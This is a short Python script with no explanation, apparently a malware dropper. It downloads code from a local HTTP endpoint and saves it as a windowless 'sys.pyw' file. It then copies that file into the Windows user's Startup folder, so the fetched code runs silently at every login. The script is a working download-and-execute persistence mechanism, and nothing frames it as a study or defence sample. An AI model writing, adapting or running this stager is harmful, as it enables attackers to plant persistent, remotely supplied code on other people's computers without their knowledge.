try:
    import requests, getpass, json, shutil
except ImportError:
    __import__('os').system('pip3 install requests')
    import requests, getpass, json, shutil
with open('sys.pyw', 'w') as file:
    file.write(json.loads(requests.get('http://127.0.0.1:50001/api/get_code').text)['code'])
dir_name = f'C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
shutil.copy('sys.pyw', dir_name)
